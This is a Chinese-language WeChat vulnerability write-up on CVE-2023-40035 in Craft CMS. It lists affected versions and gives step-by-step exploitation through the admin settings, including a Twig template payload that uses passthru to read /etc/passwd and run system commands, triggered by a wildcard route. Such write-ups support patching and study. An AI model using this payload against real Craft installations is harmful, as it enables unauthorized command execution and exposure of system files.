> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9CunAMKEpSGP0vUTpLmLbQ)

_**简介**_  

Craft 是国外一种灵活、用户友好的 CMS，用于在网络及其他领域创建自定义数字体验。

```
开发语言：PHP
开发框架：Yii 2.x
官方网址：https://craftcms.com/
源码信息：https://github.com/craftcms/cms

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQTecoLaqbwict5JCIv2Cgfkc3TUtiaZWYFs9KMnBrbeXCZO091I1fd2cg/640?wx_fmt=png)

_**漏洞描述**_  

Craft 是一款用于在网络及其他领域创建自定义数字体验的 CMS。绕过 validatePath 函数可能会导致潜在的远程代码执行。此漏洞可能导致对易受攻击的系统进行恶意控制和数据泄露。尽管该漏洞仅在经过身份验证的用户（配置为 ALLOW_ADMIN_CHANGES=true）中可被利用，但仍然存在潜在的安全威胁（远程执行代码）。

_**影响版本**_  

```
4.0.0-RC1 ≤ craftcms ≤  4.4.14
3.0.0 ≤ craftcms ≤ 3.8.14

```

_**空间测绘**_  

```
回复“CVE-2023-40035”获取空间测绘搜索语句

```

_**漏洞利用**_

漏洞需要配置文件中的 “ALLOW_ADMIN_CHANGES” 为“true”时才能利用，默认为开启状态  

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQvxOdqpRxXKyHNtC8eAjGPvUDbbZC0CGof3I204SnKhkJCvX21yOnlg/640?wx_fmt=png)

1. 点击 “Settings”，新建一个 Filesystems”，“Base Path” 添加以下内容：

```
file:///var/www/html/templates

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQYGUERnEzqw8Drna7Lz0zfGwiaLIJpp21fm0uem5tbMASswJsuC8jyPg/640?wx_fmt=png)

2. 点击 “Settings”，新建一个“Assets”，“Asset Filesystem” 选择刚刚新建的“local_bypass”

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQvlIPjQOop1caXkPvN6m9XKrYHqca6tn9icE94n4BItK95siaXO7hWHTQ/640?wx_fmt=png)

3. 点击 “Assets”，然后点击“local_bypass”，上传“poc.ttml”，“poc.ttml” 内容如下：

```
{{'<pre>'}}
{{1337*1337}}
{{['cat /etc/passwd']|map('passthru')|join}}
{{['id;pwd;ls -altr /']|map('passthru')|join}}

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQgibKaF3bibqCstiawEPwjFuzMSxZUq4iboPQ3RNANibia5Wlsce8RCpnGfaA/640?wx_fmt=png)

4. 点击 “Settins”，然后点击“New route” 新建一个路由，“URI”设置 “*”，“Template” 设置“poc.ttml”

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQ5aZX7BUuWAjcLV84NEoOWFicYARKpx8jT1Du5cRbfpia7pyiabOBPK07A/640?wx_fmt=png)

5. 访问随便一个路由执行命令

```
http://testcms.ddev.site/123

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQp71r7OJrDmu5TAXaxC5DibNg5pnkTw4VcGxpfeyPgicQrFC8fvR3lbng/640?wx_fmt=png)

_**参考链接**_  

```
https://craftcms.com/
https://github.com/craftcms/cms/
https://nvd.nist.gov/vuln/detail/CVE-2023-40035
https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw

```

回复 “CVE-2023-40035” 获取空间测绘语句

**仅供学习交流，勿用作违法犯罪**

![](https://mmbiz.qpic.cn/mmbiz_gif/DT3jlATYvfjGuGuZE0aPCxX0TWwLugHQWw3CqhRJLOHWKamm8eibZFMxUKk8iaoTQelbyjUHZ57WiaGiaZBrjyqWkg/640?wx_fmt=gif)